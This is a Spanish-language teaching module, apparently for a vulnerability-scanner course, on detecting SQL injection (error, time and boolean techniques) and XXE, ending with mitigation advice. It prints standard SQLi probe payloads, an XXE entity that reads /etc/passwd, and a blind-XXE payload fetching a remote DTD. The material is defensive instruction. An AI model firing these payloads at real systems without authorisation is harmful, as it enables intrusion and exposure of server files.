# Módulo 02: Inyecciones del Lado del Servidor — SQLi y XXE

## 1. Introducción: La Ruptura del Límite entre Código y Datos

Toda vulnerabilidad de inyección ocurre por el mismo fallo fundamental de diseño de software: **la falta de distinción estricta entre las instrucciones de control (código) y los parámetros de entrada del usuario (datos)**.

Cuando una aplicación concatena cadenas en lugar de utilizar interfaces fuertemente tipadas y parametrizadas (como Prepared Statements o Parsers seguros), el intérprete del servidor interpreta los datos del atacante como código ejecutable.

---

## 2. Inyección SQL (SQLi): Los Tres Paradigmas de Detección

En una base de datos relacional, el motor procesa consultas mediante un analizador léxico, sintáctico y un optimizador de consultas. Un escáner debe detectar la falla a través de tres mecanismos complementarios:

```
                          Entrada del Escáner
                                   |
         +-------------------------+-------------------------+
         |                                                   |
         v                                                   v
   ¿Devuelve Error SQL?                            ¿Responde con Contenido Normal?
         |                                                   |
   [SÍ]  v                                                   v
  SQLi Basado en Error                         Pruebas Booleanas / Temporales
  (Firma del Motor BD)                                       |
                                           +-----------------+-----------------+
                                           |                                   |
                                           v                                   v
                                   ¿Diferencia en bytes?             ¿Demora intencional?
                                  [1=1 vs 1=2 diferencial]              [SLEEP(3) segundos]
                                           |                                   |
                                           v                                   v
                                    SQLi Booleano                        SQLi Time-based
```

---

### 2.1 Paradigma 1: SQLi Basado en Errores (Error-Based)

* **Mecanismo:** El escáner inyecta caracteres sintácticos reservados (`'`, `"`, `\`, `)`) diseñados para desbalancear la consulta interna.
* **El Peligro de los Falsos Positivos:** Si el escáner busca expresiones regulares genéricas como `syntax error near`, una API construida en Node.js que falle con `SyntaxError: Unexpected token` o un serializador JSON arruinado será marcado erróneamente como SQLi.
* **La Solución en el Código ([`scanner/sqli.py`](file:///c:/Users/villa/VulnScanner/scanner/sqli.py)):**
  Utilizar firmas específicas por dialecto que garantizan que el mensaje proviene del motor de la base de datos:

```python
ERROR_SIGNATURES: list[str] = [
    r"you have an error in your sql syntax",      # MySQL / MariaDB
    r"syntax error at or near\b",                 # PostgreSQL
    r"incorrect syntax near\b",                   # Microsoft SQL Server
    r"sqlite3\.operationalerror",                 # SQLite
    r"ora-[0-9]{5}",                              # Oracle DB
    r"unclosed quotation mark after the character string", # MSSQL
]
```

---

### 2.2 Paradigma 2: SQLi Basado en Tiempo (Time-Based / Blind)

* **Mecanismo:** Cuando la aplicación no muestra errores y no devuelve datos en pantalla, se instruye a la base de datos a pausar su ejecución durante un intervalo específico.
* **Payloads típicos:**
  - MySQL: `1' AND SLEEP(3)--`
  - PostgreSQL: `1'; SELECT pg_sleep(3)--`
  - MSSQL: `1'; WAITFOR DELAY '0:0:3'--`
* **Calibración Heurística:** Antes de probar, el escáner mide el **tiempo de respuesta base** del servidor ($T_{base}$). Solo se confirma la vulnerabilidad si el tiempo de respuesta con el payload excede significativamente la base:
  $$\text{Duración} \ge T_{base} + 2.5 \text{ segundos}$$

---

### 2.3 Paradigma 3: SQLi Booleano Diferencial (Inferential)

* **Mecanismo:** La aplicación devuelve una página web, pero oculta o muestra registros según la consulta devuelva `TRUE` o `FALSE`.
* **Algoritmo de Verificación Matemática en OmniBreach:**
  Se envían dos peticiones idénticas salvo por la condición lógica:
  - $P_{true}$: `1 AND 1=1` (debe mantener el resultado de la consulta intacto).
  - $P_{false}$: `1 AND 1=2` (debe anular o vaciar el resultado).

Ubicación en el código: [`scanner/sqli.py`](file:///c:/Users/villa/VulnScanner/scanner/sqli.py)

```python
def test_boolean_sqli(parsed, params, param, true_payload, false_payload, baseline_body, session):
    # Petición Verdadera
    r_true = client.get(build_url(param, true_payload))
    # Petición Falsa
    r_false = client.get(build_url(param, false_payload))

    base_len = len(baseline_body)
    true_len = len(r_true.text)
    false_len = len(r_false.text)

    # REGLA DE PRECISIÓN:
    # 1. La respuesta 'verdadera' debe ser casi idéntica a la línea base (<= 40 bytes de diferencia)
    # 2. La respuesta 'falsa' debe diferir notablemente (>= 60 bytes de diferencia o código de error)
    if abs(true_len - base_len) <= 40 and (abs(false_len - base_len) >= 60 or r_false.status_code != 200):
        return {
            "vuln": f"SQLi Booleano Confirmado en '{param}'",
            "confidence": "confirmed",
            "risk": "Alto"
        }
```

---

## 3. Inyección XML (XXE - XML External Entity)

### 3.1 Anatomía del Ataque
El formato XML permite definir **DTDs (Document Type Definitions)** y **Entidades Externas**, una funcionalidad concebida para reutilizar texto o importar recursos en documentos.

Cuando un parser XML procesa entradas de usuario con soporte de entidades externas habilitado (`resolve_entities=True`), el parser resuelve URLs o rutas locales del sistema operativo con los privilegios del servidor:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<user>
  <name>&xxe;</name>
</user>
```

Si la aplicación refleja el campo `<name>` en la respuesta, el archivo `/etc/passwd` se expone directamente en pantalla (XXE Clásico).

---

### 3.2 El Desafío del Blind XXE (XXE Ciego)

En aplicaciones modernas, el XML es procesado en segundo plano (ej. importación de facturas, procesamiento SAML) y la respuesta HTTP es un simple `{"status": "processed"}` sin reflejar el contenido.

* **¿Cómo detectarlo si la respuesta no muestra nada?**
  Se fuerza al parser XML a resolver un DTD remoto alojado en un servidor controlado por el escáner (módulo OAST):

```xml
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://servidor-oast.local:8080/xxe.dtd">
  %ext;
]>
```

Si el servidor OAST recibe una conexión HTTP entrante solicitando `/xxe.dtd`, se confirma al 100% que el parser de la víctima está ejecutando código XML inseguro y resolviendo entidades arbitrarias.

---

## 4. Preguntas Clave para Estudio y Guión de Video

1. **¿Por qué la verificación diferencial en SQLi Booleano exige comparar tanto una condición verdadera como una falsa?**
   * *Respuesta:* Porque si solo se prueba una inyección y la página cambia de tamaño por un timestamp dinámico o banner rotativo, se generaría un falso positivo. La doble condición garantiza que la página responde directamente al cambio de la lógica booleana del backend.
2. **¿Cuál es la diferencia entre parametrización segura (Prepared Statements) y sanitización con expresiones regulares?**
   * *Respuesta:* Los Prepared Statements envían la plantilla SQL y los datos por canales independientes al motor de la base de datos, imposibilitando que los datos se interpreten como código. La sanitización intenta "adivinar" caracteres peligrosos y suele ser susceptible a bypasses.
3. **¿Cómo se mitiga de raíz una vulnerabilidad XXE en Java, Python o PHP?**
   * *Respuesta:* Deshabilitando por completo la resolución de DTDs y entidades externas en la configuración del parser XML (`disallow-doctype-decl = true` y `external-general-entities = false`).
